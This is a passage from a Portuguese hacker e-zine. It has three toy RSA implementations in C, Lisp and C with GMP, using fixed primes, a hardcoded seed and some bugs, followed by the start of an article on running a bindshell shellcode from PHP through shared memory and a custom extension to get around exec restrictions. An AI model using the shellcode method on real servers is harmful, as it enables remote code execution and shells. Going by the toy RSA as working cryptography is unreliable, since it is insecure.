+gerar chaves RSA maiores que 32 bits, mas eu reparei que chaves maiores q 64
+bits deixam os calculos muiiiiiito lerdos.
+
+Na terceira eu fiz em C e usei a biblioteca GNU MP
+( http://www.swox.com/gmp/ )
+Por isso podemos usar chaves de qualquer tamanho e eu usei funcoes da
+biblioteca para gerar os numeros primos aleatorios. Alem disso, por ter todos os
+calculos otimizados pela propria biblioteca, o programa consegue gerar chaves de
+2048 bits por exemplo e encriptar/desencriptar os dados rapidamente.
+
+--------------------------------------------------
+6.1 :: Simple RSA in C
+--------------------------------------------------
+
+/******************************************************************************/
+/* SIMPLE RSA IN C */
+/* BY RoOtLiQuId */
+/******************************************************************************/
+/* */
+/* NESTA VERSAO EU IMPLEMENTEI O RSA BEM SIMPLES DE MANEIRA QUE FIQUE FACIL */
+/* DE ENTENDER */
+/* NAO USEI NENHUMA BIBLIOTECA, E POR ISSO A MAIOR CHAVE RSA QUE PODEMOS TER */
+/* VAI SER DE 32 BITS DEVIDO A LIMITACAO DA ARITMETICA PADRAO DA LINGUAGEM C */
+/******************************************************************************/
+#include
+#include
+#include
+
+#define ULONG unsigned long long
+#define LONG long long
+
+/* como nao ensinei um jeito de achar numeros primos,
+aki vao 2 numeros primos predefinidos*/
+#define PRIMO1 17863
+#define PRIMO2 17851
+
+typedef struct RSA_PublicKEY {
+ULONG N;
+ULONG E;
+} RSA_PublicKEY;
+
+typedef struct RSA_KEY {
+
+/* Private Key : */ ULONG D;
+
+RSA_PublicKEY publicKey;
+
+} RSA_KEY;
+
+/******************************************************************************/
+/* Aqui se faz o calculo do "modular inverse of an integer when that integer */
+/* is relatively prime to the modulus" */
+/* hehehehe, ou seja: */
+/* Devemos achar D tal que : ( E*D ) % PHI == 1 */
+/* Portanto usamos o Fuckin Bizzarre "Extended Euclidian Algorithm" */
+/*Veja mais em http://www.grc.nasa.gov/WWW/price000/pfc/htc/zz_xeuclidalg.html*/
+/******************************************************************************/
+ULONG RSA_extend(ULONG E, ULONG PHI) {
+LONG q, u2, u3, v2, v3, t2, t3;
+
+u2 = 0;
+u3 = (LONG)PHI;
+v2 = 1;
+v3 = (LONG)E;
+
+while (v3 != 0)
+{
+q = u3/v3 ;
+t2 = u2 - q * v2;
+t3 = u3 - q * v3;
+
+u2 = v2;
+u3 = v3;
+
+v2 = t2;
+v3 = t3;
+}
+printf("u2 = %d u3 = %d\n", u2, u3);
+
+if (u2 < 0)
+return (ULONG)u2 + PHI;
+else
+return (ULONG)u2;
+}
+
+/******************************************************************************/
+/* Calculo do GREATEST COMMON DIVISOR */
+/* ou seja, Maior Divisor Comum ou MDC */
+/******************************************************************************/
+ULONG RSA_GCD( ULONG e, ULONG PHI ) {
+ULONG a, great;
+
+if (e > PHI) {
+while (e%PHI != 0) {
+a = e%PHI;
+e = PHI;
+PHI = a;
+}
+great = PHI;
+} else {
+while (PHI%e != 0) {
+a = PHI%e;
+PHI = e;
+e = a;
+}
+great = e;
+}
+return great;
+}
+
+/******************************************************************************/
+/* Calculo necessario para encontrar o E da formula: */
+/* E satisfaz a condição: MDC( E, PHI ) == 1 */
+/******************************************************************************/
+ULONG RSA_tofindE( ULONG PHI, ULONG P, ULONG Q ) {
+ULONG great;
+ULONG e;
+
+great = 0;
+e = 2;
+
+while (great != 1) {
+e = e + 1;
+great = RSA_GCD(e,PHI);
+}
+return e;
+}
+
+/******************************************************************************/
+/* Aqui vamos usar os numeros primos PRIMO1 e PRIMO2 definidos lah em cima */
+/* para gerar as chaves publicas e privadas */
+/******************************************************************************/
+void RSA_generateKey( RSA_KEY * key ){
+ULONG P, Q, PHI;
+
+P = PRIMO1 ;
+
+Q = PRIMO2 ;
+
+PHI = (P - 1) * (Q - 1);
+key->publicKey.E = RSA_tofindE( PHI, P, Q );
+key->publicKey.N = P * Q;
+key->D = RSA_extend( key->publicKey.E, PHI );
+
+printf( "PHI %u ", PHI );
+printf( " N %u ", key->publicKey.N );
+printf( " E %u ",key->publicKey.E );
+printf( " D %u ",key->D );
+printf( "\n\n" );
+}
+
+/******************************************************************************/
+/* Funcao usada para encriptar um numero ULONG data */
+/* precisamos apenas da chave publica */
+/* */
+/* Cripted = Message^E mod N; */
+/******************************************************************************/
+ULONG RSA_PublicEncrypt( ULONG data, RSA_PublicKEY publicKey ){
+ULONG C, F, i;
+
+/* Metodo ruin:
+C = (ULONG)pow(data, publicKey.E) % publicKey.N;
+
+Este metodo eh ruin pois vc vai elevar um numero grande a outro muito
+grande e depois com esse resultado vai fazer um modulo pelo numero N
+Ao inves de fazer assim, podemos simplismente fazer um loop onde vamos
+multiplicando o numero por ele mesmo e jah vai fazendo modulo por N
+Assim economizamos precisao, pois nunca teremos um numero super
+gigantesco, ele vai ficar sempre no maximo do tamanho de N
+*/
+
+if ( publicKey.E % 2 == 0) {
+C = 1;
+F = (data*data) % publicKey.N;
+
+for ( i = 1; i <= publicKey.E/2; i++) {
+C = (F*C) % publicKey.N;
+}
+
+} else {
+C = data;
+F = (data*data) % publicKey.N;
+
+for ( i = 1; i <= publicKey.E/2; i++) {
+C = (F*C) % publicKey.N;
+}
+
+}
+
+printf( " %u Encripted is:", data );
+printf(" %u \n", C );
+
+return C;
+}
+
+/******************************************************************************/
+/* funcao usada para desencriptar um numero ULONG C */
+/* Precisaremos da chave privada */
+/* */
+/* Message = Cripted^D mod N */
+/******************************************************************************/
+ULONG RSA_PrivateDecrypt( ULONG C, RSA_KEY key ){
+ULONG G, F;
+ULONG i;
+
+/* metodo Ruin:
+G = (ULONG)(pow( C, key.D )) % key.publicKey.N;
+pelo mesmo motivo anterior
+*/
+
+if ( key.D % 2 == 0) {
+G = 1;
+F = (C*C) % key.publicKey.N;
+for ( i = 1; i <= key.D/2; i++) {
+G = (F*G) % key.publicKey.N;
+}
+} else {
+G = C;
+F = (C*C) % key.publicKey.N;
+for ( i = 1; i <= key.D/2; i++) {
+G = (F*G) % key.publicKey.N;
+}
+}
+
+printf( " %u Decripted is:", C );
+printf( " %u \n\n", G );
+
+}
+
+/* Fuckin Main Function */
+int main(){
+
+RSA_KEY key; /* declaracao da nossa chave */
+
+printf("\n");
+
+RSA_generateKey( &key ); /* Geramos a chave */
+
+/* Encriptamos o numero 123456789 */
+ULONG c = RSA_PublicEncrypt( (ULONG)(123456789), key.publicKey );
+
+/* Pegamos o numero encriptado e descriptografamos para ver se fica
+igual ao inicial */
+RSA_PrivateDecrypt( c, key );
+
+printf("\n");
+
+return 0;
+}
+/******************************************************************************/
+/* END OF SIMPLE RSA IN C */
+/******************************************************************************/
+
+--------------------------------------------------
+6.2 :: Simple RSA in LISP
+--------------------------------------------------
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; SIMPLE RSA IN LISP ;;
+;; By RoOtLiQuId ;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; ;;
+;; ESTA VERSAO ESTA IMPLEMENTADA DE FORMA BEM SIMPLES, MAS O LISP USA ;;
+;; ARITMETICA ABITRARIA POR PADRAO, POR ISSO PODEMOS GERAR CHAVES RSA DE ;;
+;; QUAISQUER TAMANHOS DE BITS: 512, 1024, 2048, MAS EU PERCEBI QUE CHAVES ;;
+;; MAIORES QUE 64 BITS FAZEM OS CALCULOS FICAREM MUITO LENTOS, POIS NESSA ;;
+;; IMPLEMENTACAO EU NAO OTIMIZEI NADA ;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; Esquema do RSA: ;;
+;; Chave P?blica: E e N ;;
+;; Chave Privada: D e N ;;
+;; ;;
+;; N = P * Q ;;
+;; PHI = (P-1)*(Q-1) ;;
+;; E satisfaz a condi??o: MDC( E, PHI ) == 1 ;;
+;; D satisfaz a condi??o: ( E*D ) % PHI == 1 ;;
+;; ;;
+;; Encriptando: ;;
+;; C = M^E mod N ;;
+;; ;;
+;; Desencriptando: ;;
+;; M = C^D mod N ;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;; findE_helper
+;;; Desc: Funcao auxiliar de findE
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+(defun findE_helper ( phi p q great e )
+(if (= great 1)
+(- e 1)
+(findE_helper phi p q (GCD e phi) (+ e 1) )
+)
+)
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;; findE
+;;; Desc: Funcao usada para encontrar o valor de E que satizfaz a
+;;; condicao MDC( E, PHI ) == 1
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+(defun findE ( phi p q )
+(findE_helper phi p q 0 2 )
+)
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;; extend_helper
+;;; Desc: Funcao auxiliar de extend
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+(defun extend_helper( e phi u2 u3 v2 v3 )
+(let ( (q (floor (/ u3 v3 ) ) ) )
+(let ( (t2 (- u2 (* q v2 ) ) )
+(t3 (- u3 (* q v3 ) ) )
+)
+
+(if (not (= t3 0) )
+(extend_helper e phi v2 v3 t2 t3 )
+(if (< v2 0)
+(+ v2 phi)
+v2
+)
+)
+)
+)
+)
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;; extend
+;;; Desc: Funcao baseada no extended euclidian algorithm para
+;;; encontrar D tal que D satisfaz a condi??o: ( E*D ) % PHI == 1
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+(defun extend( e phi )
+(extend_helper e phi 0 phi 1 e )
+)
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;; expt_mod_helper
+;;; Desc: Funcao auxiliar de expt_mod
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+(defun expt_mod_helper( x y n k )
+(if (= y 1)
+k
+(expt_mod_helper x (- y 1) n (mod (* k x ) n ) )
+)
+)
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;; expt_mod
+;;; Desc: Funcao gambiarra matematica usada pra fazer x^y % n
+;;; sem precisar calcular o valor de x^y, pois esse valor poderia
+;;; ser muito alto.
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+(defun expt_mod( x y n )
+(expt_mod_helper x y n x )
+)
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;; encript
+;;; Desc: Funcao usada para encriptar um dado numero com a chave
+;;; publica E e N previamente calculada
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+(defun encript ( number e n )
+;(mod (expt number e) n)
+(expt_mod number e n )
+)
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;; decript
+;;; Desc: Funcao usada para desencriptar um dado numero com a chave
+;;; privada D e N previamente calculada
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+(defun decript ( number d n )
+;(mod (expt number d) n)
+(expt_mod number d n )
+)
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;; chamadas e calculos:
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+;Numeros Primos definidos
+(setf P 1021 )
+(setf Q 2689 )
+
+(setf N (* P Q) )
+
+(setf PHI (* (- P 1 ) (- Q 1 ) ) )
+(setf E (findE PHI P Q ) )
+(setf D (extend E PHI ) )
+
+'Encriptando_o_numero_1234567
+(setf enc (encript 1234567 E N ) )
+
+'Decriptando
+(setf dec (decript enc D N ) )
+
+'resultado
+dec
+
+(quit)
+
+--------------------------------------------------
+6.3 :: COMPLETE RSA IN C USING GNU MP LIBRARY
+--------------------------------------------------
+
+/******************************************************************************/
+/* COMPLETE RSA IN C USING GNU MP LIBRARY */
+/* BY RoOtLiQuId */
+/******************************************************************************/
+/* NESTA VERSAO EU USO A GNU MP LIBRARY PARA FAZER OS CALCULOS COM PRECISAO */
+/* ABITRARIA, OU SEJA, PODEMOS FAZER CALCULOS COM NUMEROS MAIORES QUE 64 BITS */
+/* PORTANTO DAH PRA FAZER RSA COM CHAVES BEM GRANDES, 512, 1024, */
+/* 2048 BITS E MAIORES */
+/* */
+/* PARA SABER MAIS E BAIXAR A GNU MP ENTRE EM: */
+/* http://www.swox.com/gmp/ */
+/******************************************************************************/
+/* */
+/* OBSERVACOES: */
+/* Esse programa pode usar qualquer quantidade de bits para */
+/* gerar as chaves RSA */
+/* Ele apenas encripta e desencripta um numero qualquer com o tamanho maximo */
+/* de bits da chave RSA */
+/* Para encriptar um texto ou um arquivo qualquer voce vai ter que fazer uma */
+/* funcao que quebre o texto ou arquivo em varios pedacos e codifique esses */
+/* pedacos em numeros que serao encriptados, de forma que posteriormente esses*/
+/* numeros possam ser convertidos novamente no texto ou no arquivo original */
+/* */
+/* Se eu tiver tempo, depois vou fazer uma versao completa que pode encriptar */
+/* e descriptar qualquer arquivo ou texto ou outro tipo de dados */
+/******************************************************************************/
+
+#include
+#include
+#include
+
+typedef struct RSA_PublicKEY {
+mpz_t N;
+mpz_t E;
+} RSA_PublicKEY;
+
+typedef struct RSA_KEY {
+
+/* Private Key : */ mpz_t D;
+
+RSA_PublicKEY publicKey;
+
+} RSA_KEY;
+
+/******************************************************************************/
+/* Gerar os dois numeros primos randonomicos */
+/******************************************************************************/
+void genRandomPrimes( mpz_t* prime1, mpz_t* prime2, char* seed_num,
+unsigned long int seed_tick, unsigned int keySize )
+{
+gmp_randstate_t state;
+mpz_t rand_number;
+mpz_t seed;
+
+mpz_init ( rand_number );
+gmp_randinit_default( state );
+
+printf( "%s", seed_num );
+
+if( mpz_init_set_str (seed, seed_num, 10) != 0 ){
+printf( "Erro fazendo mpz_init_set_str \n" );
+exit(0);
+}
+
+if( seed_tick <=0 )
+seed_tick = 1;
+mpz_mul_ui( seed, seed, seed_tick );
+
+gmp_randseed( state, seed );
+
+mpz_urandomb( rand_number, state, keySize/2 );
+mpz_nextprime( *prime1, rand_number);
+
+mpz_nextprime( *prime2, *prime1);
+
+gmp_randclear( state );
+mpz_clear( seed );
+mpz_clear( rand_number );
+
+}
+
+/******************************************************************************/
+/* Calcular o E */
+/******************************************************************************/
+void toFindE( mpz_t* PHI, mpz_t* e )
+{
+mpz_t great;
+
+mpz_init_set_ui ( great , 0 );
+mpz_set_ui ( *e, 2 );
+
+while ( mpz_cmpabs_ui( great, 1) != 0 ) {
+mpz_add_ui ( *e, *e, 1);
+mpz_gcd ( great, *e , *PHI);
+}
+
+mpz_clear( great );
+}
+
+/******************************************************************************/
+/* Calcular o D */
+/******************************************************************************/
+void extend( mpz_t* E, mpz_t* PHI, mpz_t* D) {
+mpz_t q, u2, u3, v2, v3, t2, t3;
+mpz_init( q );
+mpz_init( u2 );
+mpz_init( u3 );
+mpz_init( v2 );
+mpz_init( v3 );
+mpz_init( t2 );
+mpz_init( t3 );
+
+mpz_set_ui (u2, 0);
+mpz_set (u3, *PHI);
+mpz_set_ui (v2, 1);
+mpz_set (v3, *E);
+
+while ( mpz_sgn( v3 ) != 0 )
+{
+mpz_cdiv_q ( q, u3, v3);
+
+mpz_set (t2, u2);
+mpz_submul (t2, q, v2); /* t2 = t2 - q times v2. */
+
+mpz_set (t3, u3);
+mpz_submul (t3, q, v3); /* t3 = t3 - q times v3. */
+
+mpz_set (u2, v2);
+mpz_set (u3, v3);
+
+mpz_set (v2, t2);
+mpz_set (v3, t3);
+}
+
+if ( mpz_sgn( u2 ) < 0)
+mpz_add ( *D, u2, *PHI);
+else
+mpz_set (*D, u2);
+
+mpz_clear( q );
+mpz_clear( u2 );
+mpz_clear( u3 );
+mpz_clear( v2 );
+mpz_clear( v3 );
+mpz_clear( t2 );
+mpz_clear( t3 );
+}
+
+/******************************************************************************/
+/* Gerar a chave, sem verificar se eh uma chave que funciona */
+/******************************************************************************/
+void makeKey( RSA_KEY* key, char* seed_num,
+unsigned long int seed_tick, unsigned int keySize )
+{
+mpz_t prime1, prime2, prime1b, prime2b;
+mpz_t PHI;
+
+mpz_init ( prime1 );
+mpz_init ( prime2 );
+mpz_init ( PHI );
+mpz_init ( key->publicKey.N );
+mpz_init ( key->publicKey.E );
+mpz_init ( key->D );
+
+genRandomPrimes( &prime1, &prime2, seed_num, seed_tick, keySize );
+
+printf( "Prime1 = %s \n", mpz_get_str (NULL, 10, prime1) );
+printf( "Prime2 = %s \n", mpz_get_str (NULL, 10, prime2) );
+
+/* N = P * Q */
+mpz_mul ( key->publicKey.N, prime1, prime2);
+printf( "N = %s \n", mpz_get_str (NULL, 10, key->publicKey.N) );
+
+/* PHI = (P-1)*(Q-1) */
+mpz_init ( prime1b );
+mpz_init ( prime2b );
+mpz_sub_ui( prime1b, prime1, 1);
+mpz_sub_ui( prime2b, prime2, 1);
+mpz_mul ( PHI, prime1b, prime2b );
+mpz_clear( prime1b );
+mpz_clear( prime2b );
+printf( "PHI = %s \n", mpz_get_str (NULL, 10, PHI) );
+
+/* E satisfaz a condição: MDC( E, PHI ) == 1 */
+toFindE( &PHI, &key->publicKey.E );
+printf( "E = %s \n", mpz_get_str (NULL, 10, key->publicKey.E) );
+
+/* D satisfaz a condição: ( E*D ) % PHI == 1 */
+extend( &key->publicKey.E, &PHI, &key->D );
+
+printf( "D = %s \n", mpz_get_str (NULL, 10, key->D) );
+
+mpz_clear( prime1 );
+mpz_clear( prime2 );
+mpz_clear( PHI );
+}
+
+/******************************************************************************/
+/* Encriptar */
+/******************************************************************************/
+void publicEncrypt( mpz_t data, RSA_PublicKEY publicKey, mpz_t cripted )
+{
+mpz_powm ( cripted, data, publicKey.E, publicKey.N);
+}
+
+/******************************************************************************/
+/* Decriptar */
+/******************************************************************************/
+void publicDecrypt( mpz_t cripted, RSA_KEY key, mpz_t data )
+{
+mpz_powm ( data, cripted, key.D, key.publicKey.N);
+}
+
+/******************************************************************************/
+/* Gerar a chave, e verificar se eh uma chave que funciona, se nao for, */
+/* gera outra aumentando o seed_tick */
+/* Eu tive que fazer isso, pois a funcao que gera os dois numeros primos pode */
+/* errar, ela nao eh 100% confiavel, ela pode gerar um numero que nao eh primo*/
+/* e o algoritmo do RSA soh funciona quando os dois numeros sao primos */
+/* verdadeiros, por isso temos que testar se a chave funciona */
+/******************************************************************************/
+void InitAndMakeValidKey( RSA_KEY* key, char* seed_num, unsigned int keySize )
+{
+unsigned long int seed_tick = 1;
+mpz_t data, cripted, decripted;
+
+mpz_init( cripted );
+mpz_init( decripted );
+mpz_init_set_str( data, "12345", 10);
+
+do{
+makeKey( key, seed_num, seed_tick, keySize );
+
+publicEncrypt( data, key->publicKey, cripted );
+publicDecrypt( cripted, *key, decripted );
+
+seed_tick++;
+}while( mpz_cmp( data, decripted ) != 0 );
+}
+
+/* Fuckin Main Function */
+int main()
+{
+/* OBS: a random seed deve ser uma string de um numero bem grande */
+/* O melhor seria pedir pro usuario entrar com um numero aleatorio */
+#define RANDOM_SEED "9423477068029340805793923728080760045047333655414855309485"
+
+/* Tamanho em BITS da chave RSA */
+#define KEY_SIZE 1024
+
+RSA_KEY key;
+InitAndMakeValidKey( &key, RANDOM_SEED, KEY_SIZE );
+mpz_t data, cripted, decripted;
+
+mpz_init( cripted );
+mpz_init( decripted );
+
+/* Inicializar os dados que serao encriptados */
+mpz_init_set_str( data, "55555555555555555555555555555555555555555555", 10);
+
+printf( "\n\n\n" );
+printf( "N = %s \n", mpz_get_str (NULL, 10, key.publicKey.N) );
+printf( "DATA = %s \n", mpz_get_str (NULL, 10, data) );
+
+/* encriptar */
+publicEncrypt( data, key.publicKey, cripted );
+publicDecrypt( cripted, key, decripted );
+
+/* decriptar */
+printf( "CRIPTED = %s \n", mpz_get_str (NULL, 10, cripted) );
+printf( "DECRIPTED = %s \n", mpz_get_str (NULL, 10, decripted) );
+
+return 0;
+}
+
+/******************************************************************************/
+/* END OF COMPLETE RSA IN C USING GNU MP LIBRARY */
+/******************************************************************************/
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[04]-=[Shellcode em PHP]-=|tDs|-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+________________
+| [1] INTRODUÇÃO |
+`================
+Sometimes, PHP "as is" simply isn't enough. Although these cases are rare
+for the average user, professional applications will soon lead PHP to the edge
+of its capabilities, in terms of either speed or functionality. New
+functionality cannot always be implemented natively due to language
+restrictions and inconveniences that arise when having to carry around a huge
+library of default code appended to every single script, so another method
+needs to be found for overcoming these eventual lacks in PHP.
+As soon as this point is reached, it's time to touch the heart of PHP and
+take a look at its core, the C code that makes PHP go.
+http://www.zend.com/apidoc/zend.php
+
+External modules can be loaded at script runtime using the function dl().
+This function loads a shared object from disk and makes its functionality
+available to the script to which it's being bound. After the script is
+terminated, the external module is discarded from memory.
+http://www.zend.com/apidoc/zend.possibilities.php
+
+A criação de módulos em PHP pode ser algo muito interessante, desde que
+os propósitos desta criação sejam interessantes. Ultrapassar os limites de
+alguma coisa normalmente é interessante. Então, podemos tentar ultrapassar os
+limites do PHP e executar shellcodes em scripts nesta linguagem.
+
+____________________________________________
+| [2] O QUE SERÁ NECESSÁRIO E COMO SERÁ FEITO|
+`============================================
+Para executarmos um shellcode utilizando um script em PHP, serão
+necessários dois itens:
+
+- O shellcode que se deseja executar;
+- Alguma função que execute shellcodes armazenados em segmentos de memória
+compartilhada.
+
+O primeiro item é fácil de se adquirir (seja fazendo um "na unha" ou
+procurando no google). Para o segundo, existe uma ferramenta desenvolvida
+pelo sloth do nopninjas (encontrei esta ferramenta no site
+http://www.shellcode.com.ar/linux/lnx-shm_shell.c ). Usarei ele, com algumas
+modificações.
+
+Será feito da seguinte forma:
+
+1 - Primeiro, deve-se colocar o shellcode em um segmento de memória
+compartilhada em um determinado id. Para fazer isso são necessários dois passos:
+
+a) Criar o segmento de memória compartilhada, utilizando a função
+shmop_open (). Uma breve descrição desta função, do manual do php:
+
+int shmop_open ( int key, string flags, int mode, int size)
+shmop_open() pode criar ou abrir um bloco de memória compartilhada.
+shmop_open() pega 4 parâmetros: chave, que é usado pelo id do sistema para
+o bloco de memória compartilhada, esse parâmetro pode ser passado como
+decimal ou hexadecimal. O segundo parâmetro são flags que você pode usar:
+
+* "a" para acesso (seta SHM_RDONLY para shmat) use essa flag quando você
+precisar abrir um bloco de memória compartilhada existente como somente
+leitura
+
+* "c" para criar (seta IPC_CREATE) use essa flag quando você precisar criar
+um novo bloco de memória compartilhada ou se um segmento com a mesma chave
+existir, tente abrir isso para ler e escrever
+
+* "w" para ler & acesso à escrita use essa flag quando você precisar ler e
+escrever para um segmento de bloco de memória compartilhada, use essa flag
+na maior parte dos casos.
+
+* "n" cria um novo segmento de memória (seta IPC_CREATE|IPC_EXCL) use essa
+flag quando você quer criar um novo segmento de memória compartilhada mas
+se um já existir com a mesma flag, irá falhar. Isso é útil para propósitos
+de segurança, usando isso você pode previnir rápidos exploits.
+
+O terceiro parâmetro é o modo, que são permissões que você deseja designar
+para o seu segmento de memória, estas são as mesmas permissões para o
+arquivo. Permissões precisam ser passadas no formato octal ex. 0644.
+O último parâmetro é o tamanho do bloco de memória compartilhada que você
+deseja criar em bytes.
+
+b) Colocar o shellcode no segmento de memória compartilhada criado
+anteriormente, utilizando a função shmop_write (). Uma breve descrição
+desta função, do manual do php:
+
+int shmop_write ( int shmid, string data, int offset)
+shmop_write() irá escrever uma string em um bloco de memória compartilhada.
+shmop_write() pega 3 parâmetros: shmid, que é o identificador do bloco de
+memória compartilhada criado por shmop_open(), dados, uma string que você
+quer escrever em um bloco de memória compartilhada e o último, que
+especifica onde começa a escrita de dados dentro do segmento de memória
+compartilhada.
+
+2 - Uma vez com o shellcode ja na memória, é necessario executar o conteúdo
+deste segmento como se fosse um código executável (e é). Existem dois modos
+(sim, existem mais) para se executar o shellcode.
+
+a) Compilar a ferramenta que foi citada acima e executa-la. Mas, se posso
+executar um binário que eu mesmo criei no servidor por que eu iria querer
+executar um shellcode em memória compartilhada, se eu posso criar um
+binário que faça a mesma coisa que o shellcode? Talvez por diversão.
+Então, parte-se do suposto que você não pode (ou não quer) executar um
+binário através das funções de execução do PHP (system, shell_exec, ...)
+ou via linha de comando. Temos então a opção b:
+
+b) Criar uma extensão, em c, que desempenhe o mesmo papel da ferramenta
+citada anteriomente. Nesta extensão, exportariamos uma função que, quando
+chamada, executasse o segmento de memória compartilhada que fosse indicado.
+
+Por motivos óbvios, será usada a segunda opção.
+
+______________________________________
+| [3] COLOCANDO O SHELLCODE NA MEMÓRIA |
+`======================================
+Esta provavelmente seja a parte mais fácil. Não estarei mostrando como
+criar um shellcode, por já ter muito material bom na internet (colocarei
+alguns links ao fim do texto, onde você poderá aprender a desenvolver
+shellcodes e também pegar alguns exemplos prontos.
+Como dito anteriormente, o shellcode será colocado na memória utilizando
+as funções de memória compartilhada. Utilizarei um shellcode de uma bindshell.
+Vejamos como pode ser feito:
+
+---shellcode_up.php-----------------------------------------------------------
+
+';
+
+/*
+Deleta o bloco de memoria compartilhada, 15 segundos apos criar
+*/
+sleep (15);
+if(!shmop_delete($shmAbre)) {
+die ("Erro ao deletar bloco.");
+}
+
+/*
+Fecha o bloco de memoria compartilhada
+*/
+shmop_close($shmAbre);
+echo 'Bloco destruido.';
+?>
+
+---fim de shellcode_up.php----------------------------------------------------
+
+Agora, observando os segmentos de memória compartilhada, antes de executar
+o script, temos:
+
+$ whatis ipcs
+ipcs (8) - provide information on ipc facilities
+$ ipcs -m
+------ Shared Memory Segments --------
+key shmid owner perms bytes nattch status
+0x00000000 11862018 tds 600 393216 2 dest
+0x00000000 11894787 tds 600 393216 2 dest
+0x00000000 14090244 tds 777 393216 2 dest
+0x00000000 22511621 root 644 151552 2 dest
+
+Após a execução do script, temos o seguinte (durante 15 segundos apenas,
+conforme informado no script):
+
+$ ipcs -m
+------ Shared Memory Segments --------
+key shmid owner perms bytes nattch status
+0xfacedead 89292801 apache 666 92 1 <-------------.
+0x00000000 11862018 tds 600 393216 2 dest |
+0x00000000 11894787 tds 600 393216 2 dest |
+0x00000000 14090244 tds 777 393216 2 dest |
+0x00000000 22511621 root 644 151552 2 dest |
+|
+nosso shellcode está aqui <-------+
+
+Como nota-se, o segmento foi criado. O proprietário é o usuário apache
+(o mesmo que executa o processo do servidor apache) e as permissões de acesso
+estão em 666 (as permissões são semelhantes as permissões de acesso a
+arquivos), conforme foi indicado no script.
+Foi dito que a para a execução de shellcode utilizando scripts em php eram
+necessários dois passos:
+
+"Primeiro deve-se colocar o shellcode em um segmento de memória
+compartilhada
+em um determinado id".
+
+O primeiro passo então já foi concretizado. O shellcode já pode ser
+colocado na memória e temos o id do segmento (0xfacedead). O segundo passo é:
+
+"Uma vez com o shellcode já na memória, é necessario executar o conteúdo
+deste segmento como se fosse um código executável (e é)".
+
+Como foi visto, a execução deste segmento de memória compartilhada se dará
+pela utilização de um módulo. Vamos a criação dele agora.
+
+_______________________
+| [4] CRIAÇÃO DO MÓDULO |
+`=======================
+A criação do módulo será feita utilizando a última versão do PHP (php 5).
+Primeiramente será necessário baixar o fonte dele, no endereço
+http://br.php.net/get/php-5.0.0.tar.bz2/from/a/mirror . Após copia-lo,
+descompacte-o em algum diretório. Descompactei ele em "/tmp/php-5.0.0/".
+A criação de módulos não será explicada detalhadamente, pois não é este
+o objetivo, então, apenas alguns comentários serão feitos durante este
+desenvolvimento.
+Uma vez no diretório do fonte do PHP, vemos diversos sub-diretórios. Por
